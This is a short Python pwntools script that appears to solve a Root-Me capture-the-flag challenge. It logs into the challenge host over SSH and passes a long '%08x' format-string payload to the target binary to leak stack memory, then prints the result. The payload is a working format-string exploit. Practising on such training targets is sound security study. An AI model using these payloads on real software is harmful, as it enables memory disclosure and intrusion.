from pwn import *

socket = ssh(
    host="challenge02.root-me.org",
    user="app-systeme-ch5",
    password="app-systeme-ch5",
    port=2222,
)

p = socket.process(
    [
        "./ch5",
        "%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x",
    ]
)

output = p.recvline().decode().strip()

print(f"\nOutput:\n\n{output}\n")
